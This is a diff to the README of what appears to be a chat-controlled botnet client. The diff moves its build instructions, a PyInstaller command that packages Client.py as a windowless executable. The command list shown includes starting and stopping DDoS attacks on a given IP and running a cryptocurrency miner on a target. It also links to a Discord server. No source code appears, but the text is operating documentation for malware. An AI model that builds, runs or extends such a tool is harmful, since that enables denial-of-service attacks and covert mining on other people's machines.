@@ -1,6 +1,3 @@
-# How To Build
-PyInstaller --onefile --noconsole --icon=icons/Exe.ico Client.py
-
 # Bot Commands
 * !help # Help menu
 * !clear    # Clear chat
@@ -19,6 +16,9 @@ PyInstaller --onefile --noconsole --icon=icons/Exe.ico Client.py
 * !stopddos.<ip>    # Stops DDOS Attack
 * !miner.<ip>   # Start miner  # Settings on Github
 * !stopminer.<ip>   # Stop miner
+
+# How To Build
+PyInstaller --onefile --noconsole Client.py
 
 # Credits
 https://discord.gg/vCdPTjD6rZ
